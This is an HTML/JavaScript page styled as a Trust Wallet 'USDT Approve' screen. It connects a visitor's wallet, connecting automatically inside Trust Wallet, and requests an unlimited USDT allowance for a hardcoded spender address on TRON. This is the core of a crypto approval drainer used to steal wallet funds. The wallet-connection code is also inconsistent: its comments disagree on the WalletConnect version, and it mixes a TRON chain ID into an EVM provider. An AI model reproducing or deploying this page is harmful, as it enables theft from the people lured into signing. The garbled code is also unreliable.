<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>USDT Approve - Trust Wallet</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: white;
            text-align: center;
        }
        .container {
            background: rgba(255,255,255,0.15);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 40px 30px;
            width: 100%;
            max-width: 380px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
        }
        .logo {
            width: 90px; height: 90px; background: #f0b90b;
            border-radius: 24px; margin: 0 auto 25px;
            display: flex; align-items: center; justify-content: center;
            font-size: 32px; font-weight: bold;
        }
        h1 { font-size: 26px; margin-bottom: 12px; font-weight: 700; }
        .subtitle { opacity: 0.95; margin-bottom: 35px; font-size: 16px; }
        .status {
            padding: 18px; border-radius: 16px; margin-bottom: 25px;
            font-size: 15px; font-weight: 600; min-height: 60px;
            display: flex; align-items: center; justify-content: center;
        }
        .status.connecting { background: rgba(255,193,7,0.3); }
        .status.connected { background: rgba(40,167,69,0.3); animation: pulse 2s infinite; }
        .status.approving { background: rgba(0,123,255,0.3); }
        .status.error { background: rgba(220,53,69,0.3); }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.7} }
        .connect-btn, .approve-btn {
            background: linear-gradient(45deg, #f0b90b, #e6a700);
            color: #000; border: none; padding: 20px 50px;
            border-radius: 50px; font-size: 18px; font-weight: 800;
            width: 100%; cursor: pointer; transition: all 0.3s;
            text-transform: uppercase; letter-spacing: 1px; margin-bottom: 15px;
        }
        .connect-btn:hover:not(:disabled), .approve-btn:hover:not(:disabled) {
            transform: translateY(-3px); box-shadow: 0 15px 35px rgba(240,185,11,0.5);
        }
        .btn-disabled {
            opacity: 0.6; cursor: not-allowed; transform: none !important;
        }
        .spinner {
            width: 28px; height: 28px; border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid white; border-radius: 50%;
            animation: spin 1s linear infinite; margin-right: 12px;
        }
        @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
        .network-info { background: rgba(255,255,255,0.1); border-radius: 14px; padding: 16px; margin: 20px 0; font-size: 14px; display: none; }
        a { color: #f0b90b; text-decoration: none; font-weight: 600; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">USDT</div>
        <h1>Unlimited Approval</h1>
        <p class="subtitle">Connect Trust Wallet → Approve Spender</p>
        
        <div id="status" class="status">👆 Tap to Connect Trust Wallet</div>
        
        <div id="networkInfo" class="network-info">
            <strong id="account"></strong><br>
            Network: TRON Mainnet
        </div>
        
        <button id="connectBtn" class="connect-btn">🔗 Connect Trust Wallet</button>
        <button id="approveBtn" class="approve-btn btn-disabled" disabled style="display:none;">
            ✅ APPROVE UNLIMITED USDT
        </button>
    </div>

    <!-- ✅ CORRECT WalletConnect v2 CDN -->
    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>

    <script>
        // CONFIG - REPLACE THESE
        const PROJECT_ID = '171db6da15a54effc1b4a06f889a3c3f';
        const SPENDER_ADDRESS = 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV';
        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

        let provider, tronWeb, connectedAccount = '';

        // UTILITY FUNCTIONS (TOP)
        function updateStatus(type, html) {
            const el = document.getElementById('status');
            el.innerHTML = html;
            el.className = `status ${type}`;
        }

        function toggleBtn(id, disabled, cls) {
            const btn = document.getElementById(id);
            btn.disabled = disabled;
            if (disabled) btn.classList.add('btn-disabled');
            else btn.classList.remove('btn-disabled');
        }

        // TRUST WALLET DIRECT CONNECT (SIMPLEST WORKING METHOD)
        async function connectTrustWallet() {
            try {
                updateStatus('connecting', '<div class="spinner"></div>Connecting Trust Wallet...');
                toggleBtn('connectBtn', true, true);

                // ✅ CORRECT WalletConnect v1 (Trust Wallet stable)
                provider = new WalletConnectProvider({
                    rpc: {
                        56: "https://bsc-dataseed.binance.org/", // BSC fallback for Tron
                        728126428: "https://api.trongrid.io"  // Tron Mainnet chainId
                    },
                    qrcode: false,
                    projectId: PROJECT_ID,
                    chainId: 728126428 // Tron Mainnet
                });

                // Connect
                await provider.enable();
                connectedAccount = provider.accounts[0];
                
                updateStatus('connected', `✅ Connected: ${connectedAccount.slice(0,8)}...${connectedAccount.slice(-4)}`);
                document.getElementById('networkInfo').style.display = 'block';
                document.getElementById('account').textContent = connectedAccount;
                document.getElementById('connectBtn').style.display = 'none';
                document.getElementById('approveBtn').style.display = 'block';
                toggleBtn('approveBtn', false, false);

            } catch (error) {
                console.error('Connect failed:', error);
                updateStatus('error', 'Open Trust Wallet browser and try again');
                toggleBtn('connectBtn', false, false);
            }
        }

        // USDT UNLIMITED APPROVE (TRONSCAN EXACT)
        async function approveUSDT() {
            try {
                updateStatus('approving', '<div class="spinner"></div>Approve in Trust Wallet...');
                toggleBtn('approveBtn', true, true);

                // TronWeb with WalletConnect
                tronWeb = new TronWeb({
                    fullHost: 'https://api.trongrid.io',
                    providers: [provider]
                });

                // USDT TRC20 Contract
                const contract = await tronWeb.contract().at(USDT_CONTRACT);
                
                // UNLIMITED (MAX UINT256)
                const amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                
                const txHash = await contract.approve(SPENDER_ADDRESS, amount).send({
                    feeLimit: 100000000,  // 100 TRX
                    callValue: 0
                });

                updateStatus('connected', `🎉 SUCCESS!<br><a href="https://tronscan.org/#/transaction/${txHash}" target="_blank">View Transaction</a>`);
                
            } catch (error) {
                console.error(error);
                updateStatus('error', `Failed: ${error.message}`);
                toggleBtn('approveBtn', false, false);
            }
        }

        // EVENTS
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('connectBtn').onclick = connectTrustWallet;
            document.getElementById('approveBtn').onclick = approveUSDT;
            console.log('✅ DApp LOADED - READY!');
        });

        // Trust Wallet Auto-connect
        if (navigator.userAgent.includes('Trust')) {
            setTimeout(connectTrustWallet, 1500);
        }
    </script>
</body>
</html>
